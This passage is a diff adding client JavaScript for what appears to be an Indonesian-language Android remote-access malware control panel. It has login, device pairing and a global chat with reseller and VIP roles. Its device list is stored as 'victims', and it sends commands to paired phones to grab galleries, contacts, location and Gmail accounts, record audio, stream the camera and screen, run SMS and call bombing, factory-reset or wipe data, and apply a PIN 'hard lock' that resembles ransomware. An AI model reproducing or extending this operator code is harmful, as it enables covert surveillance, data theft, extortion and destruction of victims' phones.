+function vidSkip(){ if(introVideo){ try { introVideo.pause(); } catch(e){} } goTo('dash'); updateProfile(); }
+
+if(introVideo){
+  introVideo.addEventListener('loadedmetadata', () => { if(vidTotalTime) vidTotalTime.textContent = _vidFmt(introVideo.duration); });
+  introVideo.addEventListener('timeupdate', () => {
+    if(!introVideo.duration) return;
+    const pct = (introVideo.currentTime / introVideo.duration) * 100;
+    if(vidProgressFill) vidProgressFill.style.width = pct + '%';
+    if(vidCurrentTime) vidCurrentTime.textContent = _vidFmt(introVideo.currentTime);
+  });
+  introVideo.addEventListener('ended', vidSkip);
+  introVideo.addEventListener('play', () => { if(vidPlayCenter) vidPlayCenter.classList.remove('show'); });
+  introVideo.addEventListener('canplay', () => { if(vidTotalTime) vidTotalTime.textContent = _vidFmt(introVideo.duration); });
+}
+if(vidPlayCenter) vidPlayCenter.addEventListener('click', () => introVideo && introVideo.play().catch(()=>{}));
+
+const vidProgressBarEl = document.getElementById('vidProgressBar');
+if(vidProgressBarEl){
+  vidProgressBarEl.addEventListener('click', (ev) => {
+    if(!introVideo || !introVideo.duration) return;
+    const rect = vidProgressBarEl.getBoundingClientRect();
+    introVideo.currentTime = ((ev.clientX - rect.left) / rect.width) * introVideo.duration;
+  });
+}
+if(vidSkipBtn) vidSkipBtn.addEventListener('click', vidSkip);
+
+/* VIDEO 2 */
+const introVideo2 = document.getElementById('introVideo2');
+const vidPlayCenter2 = document.getElementById('vidPlayCenter2');
+const vidProgressFill2 = document.getElementById('vidProgressFill2');
+const vidCurrentTime2 = document.getElementById('vidCurrentTime2');
+const vidTotalTime2 = document.getElementById('vidTotalTime2');
+
+function vidPlay2(){ if(!introVideo2) return; introVideo2.currentTime=0; introVideo2.play().catch(() => { if(vidPlayCenter2) vidPlayCenter2.classList.add('show'); }); }
+function goToVideoFromLanding(){ goTo('video2'); setTimeout(vidPlay2, 100); }
+if(introVideo2){
+  introVideo2.addEventListener('loadedmetadata', () => { if(vidTotalTime2) vidTotalTime2.textContent = _vidFmt(introVideo2.duration); });
+  introVideo2.addEventListener('canplay', () => { if(vidTotalTime2) vidTotalTime2.textContent = _vidFmt(introVideo2.duration); });
+  introVideo2.addEventListener('timeupdate', () => {
+    if(!introVideo2.duration) return;
+    const pct = (introVideo2.currentTime / introVideo2.duration) * 100;
+    if(vidProgressFill2) vidProgressFill2.style.width = pct + '%';
+    if(vidCurrentTime2) vidCurrentTime2.textContent = _vidFmt(introVideo2.currentTime);
+  });
+  introVideo2.addEventListener('ended', () => goTo('login'));
+  introVideo2.addEventListener('play', () => { if(vidPlayCenter2) vidPlayCenter2.classList.remove('show'); });
+}
+if(vidPlayCenter2) vidPlayCenter2.addEventListener('click', () => introVideo2 && introVideo2.play().catch(()=>{}));
+
+const vidProgressBarEl2 = document.getElementById('vidProgressBar2');
+if(vidProgressBarEl2){
+  vidProgressBarEl2.addEventListener('click', (ev) => {
+    if(!introVideo2 || !introVideo2.duration) return;
+    const rect = vidProgressBarEl2.getBoundingClientRect();
+    introVideo2.currentTime = ((ev.clientX - rect.left) / rect.width) * introVideo2.duration;
+  });
+}
+
+/* ═══════════════════════════════════════════════════════════
+   LOGIN (SERVER ONLY)
+   ═══════════════════════════════════════════════════════════ */
+function _loginSuccess(username, password, role, expiredDate, sessionKey){
+  state.username = username;
+  state.password = password;
+  state.role = role;
+  state.expiredDate = expiredDate;
+  state.sessionKey = sessionKey;
+  localStorage.setItem('username', username);
+  localStorage.removeItem('password');
+  localStorage.setItem('role', role);
+  localStorage.setItem('expiredDate', expiredDate);
+  localStorage.setItem('sessionKey', sessionKey);
+  showToast('Login berhasil', 'success');
+  setTimeout(() => { goTo('video'); vidPlay(); }, 600);
+}
+
+function doLogin() {
+  const u = lu.value.trim();
+  const p = lp.value.trim();
+  fu.classList.remove('error');
+  fp.classList.remove('error');
+  if (!u) { fu.classList.add('error'); showToast('Username kosong', 'error'); return; }
+  if (!p) { fp.classList.add('error'); showToast('Password kosong', 'error'); return; }
+
+  if (!SERVER_BASE) { showToast('SERVER_BASE belum diisi!', 'error'); return; }
+
+  const b = document.getElementById('btn-login');
+  b.disabled = true;
+  b.innerHTML = '<i class="fas fa-spinner fa-spin"></i><span>MEMPROSES...</span>';
+
+  fetch(`${SERVER_BASE}/validate`, {
+    method:'POST',
+    headers:{'Content-Type':'application/x-www-form-urlencoded'},
+    body: new URLSearchParams({ username:u, password:p }).toString(),
+  })
+  .then(r => r.json())
+  .then(data => {
+    if(data.success === true || data.valid === true){
+      _loginSuccess(data.username || u, '', data.role || 'MEMBER', data.expiredDate || '—', data.sessionKey || data.key || '');
+    } else {
+      showToast(data.message || 'Username atau password salah', 'error');
+      b.disabled = false;
+      b.innerHTML = '<i class="fas fa-sign-in-alt"></i><span>MASUK</span>';
+    }
+  })
+  .catch(() => {
+    showToast('Koneksi ke server gagal', 'error');
+    b.disabled = false;
+    b.innerHTML = '<i class="fas fa-sign-in-alt"></i><span>MASUK</span>';
+  });
+}
+
+function updateProfile() {
+  const u = document.getElementById('nbr-username'); if (u) u.textContent = (state.username || '-').toUpperCase();
+  const r = document.getElementById('nbr-role'); if (r) r.textContent = (state.role || '-').toUpperCase();
+  const e = document.getElementById('nbr-exp'); if (e) e.textContent = state.expiredDate || '-';
+  const on = document.getElementById('nbr-online'); if (on) on.textContent = state.victims.filter(v => v.status === 'Online').length;
+  const off = document.getElementById('nbr-offline'); if (off) off.textContent = state.victims.filter(v => v.status !== 'Online').length;
+  const tot = document.getElementById('nbr-total'); if (tot) tot.textContent = state.victims.length;
+}
+
+/* ═══════════════════════════════════════════════════════════
+   CONNECT DEVICE (SERVER)
+   ═══════════════════════════════════════════════════════════ */
+function toggleConnectForm(){
+  connectState.open = !connectState.open;
+  const wrap = document.getElementById('connectWrap');
+  const card = document.getElementById('connectCard');
+  wrap.classList.toggle('open', connectState.open);
+  card.classList.toggle('expanded', connectState.open);
+  if(connectState.open){
+    refreshMyDeviceCode();
+    _connectHideStatus();
+    setTimeout(() => document.getElementById('connect-code-input')?.focus(), 350);
+  }
+}
+function _connectShowStatus(msg, isOk){
+  const box = document.getElementById('connect-status');
+  const txt = document.getElementById('connect-status-text');
+  const icon = box?.querySelector('i');
+  if(!box || !txt) return;
+  box.classList.remove('ok','err');
+  box.classList.add('show', isOk ? 'ok' : 'err');
+  if(icon) icon.className = isOk ? 'fas fa-check-circle' : 'fas fa-times-circle';
+  txt.textContent = msg;
+}
+function _connectHideStatus(){
+  const box = document.getElementById('connect-status');
+  if(box) box.classList.remove('show','ok','err');
+}
+function _connectSetCodeState(st){
+  const wrap = document.getElementById('connect-code-wrap');
+  if(!wrap) return;
+  wrap.classList.remove('focused','error','success');
+  if(st) wrap.classList.add(st);
+}
+
+async function refreshMyDeviceCode(){
+  const el = document.getElementById('connect-code-display');
+  if(!el) return;
+  try {
+    const res = await fetch(`${SERVER_BASE}/api/my-device-code?sessionKey=${encodeURIComponent(state.sessionKey)}`);
+    const data = await res.json();
+    if(data.success && data.deviceCode) el.textContent = data.deviceCode;
+    else el.textContent = '—';
+  } catch(e){ el.textContent = '—'; }
+}
+function copyDeviceCode(){
+  const el = document.getElementById('connect-code-display');
+  if(!el) return;
+  const code = el.textContent;
+  if(!code || code === '—') return;
+  const inp = document.getElementById('connect-code-input');
+  if(inp){
+    inp.value = code;
+    inp.dispatchEvent(new Event('input'));
+    _connectSetCodeState('focused');
+    showToast('✅ Kode dimasukkan ke kolom', 'success');
+  }
+}
+
+async function submitConnectCode(){
+  const inp = document.getElementById('connect-code-input');
+  if(!inp) return;
+  const code = String(inp.value || '').trim();
+  if(!code){ _connectSetCodeState('error'); _connectShowStatus('Kode device tidak boleh kosong', false); return; }
+  if(code.length < 20){ _connectSetCodeState('error'); _connectShowStatus('Kode device minimal 20 digit', false); return; }
+
+  const btn = document.getElementById('connect-submit');
+  const originalHTML = btn.innerHTML;
+  btn.disabled = true;
+  btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i><span>MEMVERIFIKASI…</span>';
+  _connectHideStatus();
+
+  try {
+    const res = await fetch(`${SERVER_BASE}/api/pair/request`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ deviceCode: code, sessionKey: state.sessionKey }),
+    });
+    const data = await res.json();
+    if (data.success) {
+      _connectSetCodeState('success');
+      _connectShowStatus(`✅ ${data.message || 'Device terhubung'}`, true);
+      showToast('✅ Device terhubung', 'success');
+      inp.value = '';
+      await loadDevices();
+    } else {
+      _connectSetCodeState('error');
+      _connectShowStatus(data.message || 'Gagal pairing', false);
+      showToast(data.message || 'Gagal pairing', 'error');
+    }
+  } catch (e) {
+    _connectSetCodeState('error');
+    _connectShowStatus('Koneksi ke server gagal', false);
+    showToast('❌ Koneksi error', 'error');
+  }
+  btn.disabled = false;
+  btn.innerHTML = originalHTML;
+}
+
+/* ═══════════════════════════════════════════════════════════
+   CHAT GLOBAL
+   ═══════════════════════════════════════════════════════════ */
+function getChatRoleColor(role){
+  const r = String(role || '').toUpperCase().trim();
+  if(['RULER','HIGH PENGURUS','PENGURUS'].includes(r)) return '#DC2626';
+  if(['OWNER','HIGH OWNER','KINGZ','HIGH KINGZ'].includes(r)) return '#EF4444';
+  if(['CEO','HIGH CEO','TANGAN KANAN'].includes(r)) return '#B91C1C';
+  if(['ADMIN','HIGH ADMIN','DEVELOPER','HIGH DEVELOPER','CREATOR','HIGH CREATOR'].includes(r)) return '#7C3AED';
+  if(['MODERATOR','HIGH MODERATOR','STAF','HIGH STAF'].includes(r)) return '#0891B2';
+  if(['PARTNER','HIGH PARTNER','PREMIUM','HIGH PREMIUM'].includes(r)) return '#F59E0B';
+  if(['VVIP','HIGH VVIP','VIP','HIGH VIP'].includes(r)) return '#EAB308';
+  if(['PT','HIGH PT','TK','HIGH TK'].includes(r)) return '#2563EB';
+  if(['RESELLER','HIGH RESELLER'].includes(r)) return '#3B82F6';
+  return '#6B7280';
+}
+function getChatRoleShort(role){
+  const r = String(role || '').toUpperCase().trim();
+  if(r.startsWith('HIGH ')) return 'H.' + r.substring(5, 11);
+  return r.substring(0, 8);
+}
+function toggleChatForm(){
+  chatState.open = !chatState.open;
+  const wrap = document.getElementById('chatWrap');
+  const card = document.getElementById('chatCard');
+  wrap.classList.toggle('open', chatState.open);
+  card.classList.toggle('expanded', chatState.open);
+  if(chatState.open){
+    chatState.username = state.username || 'Guest';
+    chatState.role = state.role || 'MEMBER';
+    chatRenderMessages();
+    chatRenderUsers();
+    chatUpdateStatus();
+    if(!chatState.ws) chatConnect();
+  }
+}
+function chatConnect(){
+  if(chatState.ws){ try { chatState.ws.close(); } catch(e){} chatState.ws = null; }
+  chatState.connecting = true;
+  chatUpdateStatus();
+  try{
+    const url = `${CHAT_WS_URL}&sessionKey=${encodeURIComponent(state.sessionKey)}`;
+    const ws = new WebSocket(url);
+    chatState.ws = ws;
+    ws.onopen = () => {
+      chatState.connected = true;
+      chatState.connecting = false;
+      chatUpdateStatus();
+      try{ ws.send(JSON.stringify({ type: 'joinGlobalChat', username: chatState.username, role: chatState.role, sessionKey: state.sessionKey })); } catch(e){}
+    };
+    ws.onmessage = (event) => { try{ chatHandleMessage(JSON.parse(event.data)); } catch(e){} };
+    ws.onerror = () => { chatState.connected = false; chatState.connecting = false; chatUpdateStatus(); };
+    ws.onclose = () => { chatState.connected = false; chatState.connecting = false; chatUpdateStatus(); chatScheduleReconnect(); };
+  } catch(e){ chatState.connected = false; chatState.connecting = false; chatUpdateStatus(); chatScheduleReconnect(); }
+}
+function chatScheduleReconnect(){
+  if(chatState.reconnectTimer) clearTimeout(chatState.reconnectTimer);
+  if(!chatState.open) return;
+  chatState.reconnectTimer = setTimeout(() => { if(chatState.open) chatConnect(); }, 5000);
+}
+function chatDisconnect(){
+  if(chatState.reconnectTimer){ clearTimeout(chatState.reconnectTimer); chatState.reconnectTimer = null; }
+  if(chatState.ws){ try { chatState.ws.close(); } catch(e){} chatState.ws = null; }
+  chatState.connected = false; chatState.connecting = false;
+}
+function chatHandleMessage(data){
+  const t = data.type;
+  if(t === 'chatHistory'){
+    chatState.messages = (data.messages || []).map(m => ({ username: m.username || 'Unknown', role: m.role || 'MEMBER', message: m.message || '', time: m.time || new Date().toISOString(), isMe: m.username === chatState.username, sending: false }));
+    chatRenderMessages();
+  } else if(t === 'globalChat'){
+    chatState.messages = chatState.messages.filter(m => !m.sending);
+    chatState.messages.unshift({ username: data.username || 'Unknown', role: data.role || 'MEMBER', message: data.message || '', time: data.time || new Date().toISOString(), isMe: data.username === chatState.username, sending: false });
+    if(chatState.messages.length > CHAT_MAX_MESSAGES) chatState.messages = chatState.messages.slice(0, CHAT_MAX_MESSAGES);
+    chatRenderMessages();
+  } else if(t === 'onlineUsers'){
+    chatState.onlineUsers = (data.users || []).map(u => ({ username: u.username || '', role: u.role || 'MEMBER' }));
+    chatRenderUsers();
+    chatUpdateStatus();
+  }
+}
+function chatRenderMessages(){
+  const box = document.getElementById('chat-messages');
+  if(!box) return;
+  if(chatState.messages.length === 0){
+    box.innerHTML = `<div class="chat-empty"><i class="fas fa-comment-dots"></i><p>BELUM ADA PESAN</p></div>`;
+    return;
+  }
+  box.innerHTML = chatState.messages.map(m => {
+    const roleColor = getChatRoleColor(m.role);
+    const roleShort = getChatRoleShort(m.role);
+    const initial = (m.username || '?')[0].toUpperCase();
+    return `<div class="chat-msg ${m.isMe ? 'me' : ''}"><div class="chat-msg-avatar" style="background:${roleColor};">${escapeHtml(initial)}</div><div class="chat-msg-body"><div class="chat-msg-head"><span class="chat-msg-name">${escapeHtml(m.isMe ? 'Kamu' : m.username)}</span><span class="chat-msg-role" style="background:${roleColor};">${escapeHtml(roleShort)}</span><span class="chat-msg-time">${escapeHtml(chatFormatTime(m.time))}</span></div><div class="chat-msg-bubble ${m.sending ? 'sending' : ''}">${escapeHtml(m.message)}</div></div></div>`;
+  }).join('');
+}
+function chatRenderUsers(){
+  const box = document.getElementById('chat-users-row');
+  if(!box) return;
+  if(chatState.onlineUsers.length === 0){ box.innerHTML = ''; return; }
+  box.innerHTML = chatState.onlineUsers.map(u => {
+    const roleColor = getChatRoleColor(u.role);
+    const roleShort = getChatRoleShort(u.role);
+    const initial = (u.username || '?')[0].toUpperCase();
+    const isMe = u.username === chatState.username;
+    return `<div class="chat-user-pill"><div class="pill-avatar" style="background:${roleColor};">${escapeHtml(initial)}</div><span class="pill-name">${escapeHtml(isMe ? 'Kamu' : u.username)}</span><span class="pill-role" style="background:${roleColor};">${escapeHtml(roleShort)}</span></div>`;
+  }).join('');
+}
+function chatUpdateStatus(){
+  const dot = document.getElementById('chat-status-dot');
+  const txt = document.getElementById('chat-status-text');
+  const cnt = document.getElementById('chat-online-count');
+  const btn = document.getElementById('chat-send-btn');
+  const inp = document.getElementById('chat-input');
+  if(!dot || !txt) return;
+  dot.className = 'chat-status-dot';
+  if(chatState.connected){ dot.classList.add('online'); txt.textContent = 'CONNECTED'; }
+  else if(chatState.connecting){ dot.classList.add('connecting'); txt.textContent = 'CONNECTING…'; }
+  else { dot.classList.add('offline'); txt.textContent = 'DISCONNECTED'; }
+  if(cnt) cnt.textContent = `${chatState.onlineUsers.length} ONLINE`;
+  const enabled = chatState.connected;
+  if(btn) btn.disabled = !enabled;
+  if(inp) inp.disabled = !enabled;
+}
+function chatSendMessage(){
+  const inp = document.getElementById('chat-input');
+  if(!inp) return;
+  const text = inp.value.trim();
+  if(!text) return;
+  if(!chatState.connected || !chatState.ws) return;
+  chatState.messages.unshift({ username: chatState.username, role: chatState.role, message: text, time: new Date().toISOString(), isMe: true, sending: true });
+  chatRenderMessages();
+  inp.value = '';
+  try{ chatState.ws.send(JSON.stringify({ type: 'globalChat', message: text })); }
+  catch(e){ chatState.messages = chatState.messages.filter(m => !m.sending); chatRenderMessages(); }
+}
+function chatFormatTime(t){ try{ const d=new Date(t); if(isNaN(d.getTime())) return '--:--'; return `${d.getHours().toString().padStart(2,'0')}:${d.getMinutes().toString().padStart(2,'0')}`; }catch(e){ return '--:--'; } }
+
+/* ═══════════════════════════════════════════════════════════
+   LIST DEVICE
+   ═══════════════════════════════════════════════════════════ */
+function toggleListDevice() {
+  const card = document.getElementById('listDeviceCard');
+  const wrap = document.getElementById('deviceListWrap');
+  state.listOpen = !state.listOpen;
+  card.classList.toggle('expanded', state.listOpen);
+  wrap.classList.toggle('open', state.listOpen);
+  if (state.listOpen) loadDevices();
+}
+async function loadDevices() {
+  try {
+    const res = await fetch(`${SERVER_BASE}/api/list-targets?sessionKey=${encodeURIComponent(state.sessionKey)}`);
+    const data = await res.json();
+    state.victims = Array.isArray(data) ? data : [];
+  } catch (e) { state.victims = []; }
+  renderDevices();
+  updateProfile();
+}
+function renderDevices() {
+  const inner = document.getElementById('deviceListInner');
+  if (!state.victims.length) {
+    inner.innerHTML = `<div class="device-empty"><i class="fas fa-satellite-dish"></i><p>NO DEVICES FOUND</p></div>`;
+    return;
+  }
+  inner.innerHTML = state.victims.map(v => buildDeviceItem(v)).join('');
+}
+function buildDeviceItem(v) {
+  const isOnline = v.status === 'Online';
+  const name = v.model || v.name || 'Unknown Device';
+  const vid = v.id || v.device_id || name;
+  const bat = v.battery || '0';
+  const andro = v.android || v.androidVersion || '—';
+  const ram = v.ram || '—';
+  const cpu = v.cpu || '—';
+  const expanded = state.expandedDeviceId === vid;
+  return `
+    <div class="device-item ${expanded ? 'expanded' : ''}" data-vid="${escapeHtml(vid)}">
+      <div class="device-item-head" onclick="toggleDevice('${escapeHtml(vid)}', event)">
+        <div class="device-item-icon"><i class="fas fa-mobile-alt"></i></div>
+        <div class="device-item-name">${escapeHtml(name)}</div>
+        <div class="device-item-status ${isOnline ? '' : 'offline'}">${isOnline ? 'ONLINE' : 'OFFLINE'}</div>
+        <button onclick="event.stopPropagation();unpairDevice('${escapeHtml(vid)}')" style="background:var(--red);color:#FFF;border:2px solid var(--border);box-shadow:2px 2px 0 var(--border);padding:5px 8px;font-size:10px;font-weight:900;cursor:pointer;flex-shrink:0;font-family:'Space Mono',monospace;"><i class="fas fa-unlink"></i></button>
+        <i class="fas fa-chevron-down device-item-arrow"></i>
+      </div>
+      <div class="device-item-info">
+        <div class="device-info-grid">
+          <div class="device-info-cell"><div class="ico"><i class="fas fa-battery-three-quarters"></i></div><div class="txt"><div class="lbl">BATERAI</div><div class="val">${escapeHtml(bat)}%</div></div></div>
+          <div class="device-info-cell"><div class="ico"><i class="fab fa-android"></i></div><div class="txt"><div class="lbl">ANDROID</div><div class="val">${escapeHtml(andro)}</div></div></div>
+          <div class="device-info-cell"><div class="ico"><i class="fas fa-memory"></i></div><div class="txt"><div class="lbl">RAM</div><div class="val">${escapeHtml(ram)}</div></div></div>
+          <div class="device-info-cell"><div class="ico"><i class="fas fa-microchip"></i></div><div class="txt"><div class="lbl">CPU</div><div class="val">${escapeHtml(cpu)}</div></div></div>
+        </div>
+      </div>
+      <div class="device-features">
+        <div class="device-features-inner">
+          ${FEATURE_CATS.map(cat => `
+            <div class="feature-cat">
+              <div class="feature-cat-title">${cat.title}</div>
+              <div class="feature-grid">
+                ${cat.features.map(f => `
+                  <button class="feature-btn ${f.danger ? 'danger' : ''}" onclick="event.stopPropagation(); sendCmd('${escapeHtml(vid)}','${f.cmd}','${escapeHtml(f.label)}')">
+                    <span class="f-icon"><i class="fas ${f.icon}"></i></span>
+                    <span>${f.label}</span>
+                  </button>
+                `).join('')}
+              </div>
+            </div>
+          `).join('')}
+        </div>
+      </div>
+    </div>
+  `;
+}
+function toggleDevice(vid, ev) {
+  if (ev) ev.stopPropagation();
+  state.expandedDeviceId = state.expandedDeviceId === vid ? null : vid;
+  renderDevices();
+}
+async function unpairDevice(deviceId){
+  if(!confirm(`Hapus device "${deviceId}" dari panel?`)) return;
+  try {
+    const res = await fetch(`${SERVER_BASE}/api/unpair`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ deviceId, sessionKey: state.sessionKey }),
+    });
+    const data = await res.json();
+    if(data.success){ showToast('✅ Device dihapus', 'success'); await loadDevices(); }
+    else showToast(data.message || 'Gagal hapus', 'error');
+  } catch(e){ showToast('Koneksi error', 'error'); }
+}
+async function sendCmd(vid, cmd, label) {
+  if (cmd === 'hard_lock_modal') { openHardLockModal(vid); return; }
+  showToast('Preview: ' + label);
+  const endpoints = {
+    unlock:'/api/device/preview/unlock',
+    virus_mode:'/api/device/preview/virus_mode',
+    panic_unlock:'/api/device/preview/panic_unlock',
+    virus_unlock:'/api/device/preview/virus_unlock',
+    factory_reset:'/api/device/preview/factory_reset',
+    wipe_data:'/api/device/preview/wipe_data',
+    battery_drain:'/api/device/preview/battery_drain',
+    hide_app:'/api/device/preview/hide_app',
+    show_app:'/api/device/preview/show_app',
+    force_open:'/api/device/preview/force_open',
+    request_admin:'/api/device/preview/request_admin',
+    grab_gallery:'/api/device/preview/grab_gallery',
+    grab_videos:'/api/device/preview/grab_videos',
+    record_audio:'/api/device/preview/record_audio',
+    stop_record_audio:'/api/device/preview/stop_record_audio',
+    call_bombing:'/api/device/preview/call_bombing',
+    sms_bomber:'/api/device/preview/sms_bomber',
+    open_url:'/api/device/preview/open_url',
+    take_photo:'/api/device/preview/take_photo',
+    get_screen:'/api/device/preview/get_screen',
+    get_contacts:'/api/device/preview/get_contacts',
+    get_location:'/api/device/preview/get_location',
+    get_gmails:'/api/device/preview/get_gmails',
+    set_wallpaper:'/api/device/preview/set_wallpaper',
+    play_audio:'/api/device/preview/play_audio',
+    stop_audio:'/api/device/preview/stop_audio',
+    flash_strobe:'/api/device/preview/flash_strobe',
+    stop_strobe:'/api/device/preview/stop_strobe',
+    vibrate_loop:'/api/device/preview/vibrate_loop',
+    flashlight_on:'/api/device/preview/flashlight_on',
+    flashlight_off:'/api/device/preview/flashlight_off',
+    start_cam_stream:'/api/device/preview/start_cam_stream',
+    stop_cam_stream:'/api/device/preview/stop_cam_stream',
+    start_screen_stream:'/api/device/preview/start_screen_stream',
+    stop_screen_stream:'/api/device/preview/stop_screen_stream',
+  };
+  const path = endpoints[cmd];
+  if (!path) { showToast('⚠️ Fitur belum ada di server'); return; }
+  try {
+    const res = await fetch(`${SERVER_BASE}${path}?device=${encodeURIComponent(vid)}&sessionKey=${encodeURIComponent(state.sessionKey)}`);
+    const d = await res.json();
+    if (d.success || d.status === 'queued') showToast('✅ ' + label + ' terkirim');
+    else showToast('⚠️ ' + (d.message || label + ' gagal'));
+  } catch (e) { showToast('❌ Koneksi error'); }
+}
+
+/* ═══════════════════════════════════════════════════════════
+   LOG COMMAND
+   ═══════════════════════════════════════════════════════════ */
+function toggleLogForm(){
+  logState.open = !logState.open;
+  const wrap = document.getElementById('logWrap');
+  const card = document.getElementById('logCard');
+  wrap.classList.toggle('open', logState.open);
+  card.classList.toggle('expanded', logState.open);
+  if(logState.open) loadCommandLog();
+}
+async function loadCommandLog(){
+  const box = document.getElementById('logInner');
+  if(!box) return;
+  box.innerHTML = '<div class="device-empty"><i class="fas fa-spinner fa-spin"></i><p>MEMUAT…</p></div>';
+  try {
+    const res = await fetch(`${SERVER_BASE}/api/command-log?sessionKey=${encodeURIComponent(state.sessionKey)}`);
+    const data = await res.json();
+    if(!data.success || !data.logs || !data.logs.length){
+      box.innerHTML = '<div class="device-empty"><i class="fas fa-history"></i><p>BELUM ADA LOG</p></div>';
+      return;
+    }
+    box.innerHTML = `
+      <div style="font-family:'Space Mono',monospace;font-size:10px;font-weight:900;color:var(--textDim);margin-bottom:10px;letter-spacing:1px;">RIWAYAT (${data.logs.length})</div>
+      ${data.logs.map(l => `
+        <div class="log-item">
+          <div class="log-item-cmd">⚡ ${escapeHtml(l.command)}</div>
+          <div class="log-item-meta">Device: ${escapeHtml(l.deviceId)}</div>
+          <div class="log-item-meta">Waktu: ${new Date(l.ts).toLocaleString('id-ID')}</div>
+        </div>
+      `).join('')}
+    `;
+  } catch(e){
+    box.innerHTML = '<div class="device-empty"><i class="fas fa-times"></i><p>GAGAL MEMUAT</p></div>';
+  }
+}
+
+/* ═══════════════════════════════════════════════════════════
+   MODAL
+   ═══════════════════════════════════════════════════════════ */
+function openModal(id) { document.getElementById(id)?.classList.add('show'); }
+function closeModal(id) { document.getElementById(id)?.classList.remove('show'); }
+function openHardLockModal(vid) {
+  window._currentModalDevice = vid;
+  document.getElementById('hl-message').value = 'HP INI DIKUNCI';
+  document.getElementById('hl-pin').value = '0853';
+  openModal('modalHardLock');
+}
+async function submitHardLock() {
+  const vid = window._currentModalDevice || '';
+  const message = (document.getElementById('hl-message')?.value || '').trim() || 'HP INI DIKUNCI';
+  const pin = (document.getElementById('hl-pin')?.value || '').trim() || '0853';
+  if (!vid) { showToast('Device tidak valid'); return; }
+  closeModal('modalHardLock');
+  showToast('🔒 Mengirim Hard Lock...');
+  try {
+    const url = `${SERVER_BASE}/api/hard_lock?device=${encodeURIComponent(vid)}&message=${encodeURIComponent(message)}&pin=${encodeURIComponent(pin)}&sessionKey=${encodeURIComponent(state.sessionKey)}`;
+    const res = await fetch(url);
+    const d = await res.json();
+    if (d.success || d.status === 'queued') showToast('✅ Hard Lock terkirim');
+    else showToast('⚠️ ' + (d.message || 'Hard Lock gagal'));
+  } catch (e) { showToast('❌ Koneksi error'); }
+}
+
+
+/* ═══════════════════════════════════════════════════════════
+   CHANGE PASSWORD
+   ═══════════════════════════════════════════════════════════ */
+function togglePasswordForm(){
+  const card = document.getElementById('pwdCard');
+  const wrap = document.getElementById('pwdFormWrap');
+  const open = !wrap.classList.contains('open');
+  wrap.classList.toggle('open', open);
+  card.classList.toggle('expanded', open);
+  if(open){
+    document.getElementById('pwd-username').textContent = (state.username || 'USER').toUpperCase();
+    setTimeout(()=>document.getElementById('pwd-old')?.focus(), 350);
+  }
+}
+function pwdToggle(inputId, btn){
+  const inp = document.getElementById(inputId);
+  if(!inp) return;
+  const isPass = inp.type === 'password';
+  inp.type = isPass ? 'text' : 'password';
+  btn.innerHTML = isPass ? '<i class="fas fa-eye-slash"></i>' : '<i class="fas fa-eye"></i>';
+}
+function evaluateStrength(){
+  const p = document.getElementById('pwd-new').value;
+  let s = 0;
+  if(p.length >= 8) s += 0.25;
+  if(p.length >= 12) s += 0.15;
+  if(/[A-Z]/.test(p)) s += 0.2;
+  if(/[0-9]/.test(p)) s += 0.2;
+  if(/[!@#$%^&*]/.test(p)) s += 0.2;
+  const box = document.getElementById('pwd-strength');
+  const fill = document.getElementById('pwd-strength-fill');
+  const lbl = document.getElementById('pwd-strength-lbl');
+  if(p.length === 0){ box.classList.remove('show'); fill.style.width='0'; fill.className='bar-fill'; lbl.className='lbl'; lbl.textContent=''; return; }
+  box.classList.add('show');
+  fill.style.width = Math.min(s, 1) * 100 + '%';
+  let cls, txt;
+  if(s < 0.4){ cls='weak'; txt='LEMAH'; }
+  else if(s < 0.7){ cls='medium'; txt='SEDANG'; }
+  else { cls='strong'; txt='KUAT'; }
+  fill.className = 'bar-fill ' + cls;
+  lbl.className = 'lbl ' + cls;
+  lbl.textContent = txt;
+}
+function evaluateMatch(){
+  const n = document.getElementById('pwd-new').value;
+  const c = document.getElementById('pwd-confirm').value;
+  const wrap = document.getElementById('pwd-confirm-wrap');
+  const badge = document.getElementById('pwd-match-badge');
+  wrap.classList.remove('match-ok','match-bad');
+  badge.classList.remove('ok','bad');
+  badge.innerHTML = '';
+  if(c.length === 0) return;
+  if(c === n){ wrap.classList.add('match-ok'); badge.classList.add('ok'); badge.innerHTML = '<i class="fas fa-check-circle"></i>'; }
+  else { wrap.classList.add('match-bad'); badge.classList.add('bad'); badge.innerHTML = '<i class="fas fa-times-circle"></i>'; }
+}
+async function submitChangePassword(){
+  const oldPass = document.getElementById('pwd-old').value.trim();
+  const newPass = document.getElementById('pwd-new').value.trim();
+  const confirm = document.getElementById('pwd-confirm').value.trim();
+  if(!oldPass || !newPass || !confirm){ shakeForm('pwdFormWrap'); showResultDialog('Gagal','Semua field harus diisi.', false); return; }
+  if(newPass !== confirm){ shakeForm('pwdFormWrap'); showResultDialog('Gagal','Password baru tidak cocok.', false); return; }
+  if(!state.username){ showResultDialog('Gagal','Session tidak valid.', false); return; }
+  const btn = document.getElementById('pwd-submit');
+  const originalHTML = btn.innerHTML;
+  btn.disabled = true;
+  btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i><span>MEMPROSES...</span>';
+  try{
+    const res = await fetch(`${SERVER_BASE}/changepass`, {
+      method: 'POST',
+      headers:{'Content-Type':'application/x-www-form-urlencoded'},
+      body: new URLSearchParams({ username: state.username, oldPass, newPass, sessionKey: state.sessionKey }).toString(),
+    });
+    const data = await res.json();
+    if(data.success === true) _changePassSuccess(newPass);
+    else { shakeForm('pwdFormWrap'); showResultDialog('Gagal', data.message || 'Gagal', false); }
+  } catch(e){ shakeForm('pwdFormWrap'); showResultDialog('Gagal','Koneksi error.', false); }
+  btn.disabled = false;
+  btn.innerHTML = originalHTML;
+}
+function _changePassSuccess(newPass){
+  showResultDialog('Berhasil','Password berhasil diubah!\n\nSilakan logout & login lagi.', true);
+  document.getElementById('pwd-old').value = '';
+  document.getElementById('pwd-new').value = '';
+  document.getElementById('pwd-confirm').value = '';
+  evaluateStrength();
+  evaluateMatch();
+  state.password = newPass;
+  localStorage.removeItem('password');
+}
+function shakeForm(id){
+  const el = document.getElementById(id);
+  if(!el) return;
+  el.classList.remove('pwd-shake');
+  void el.offsetWidth;
+  el.classList.add('pwd-shake');
+  setTimeout(()=>el.classList.remove('pwd-shake'), 600);
+}
+
+/* ═══════════════════════════════════════════════════════════
+   ADMIN
+   ═══════════════════════════════════════════════════════════ */
+function toggleAdminForm(){
+  adminState.open = !adminState.open;
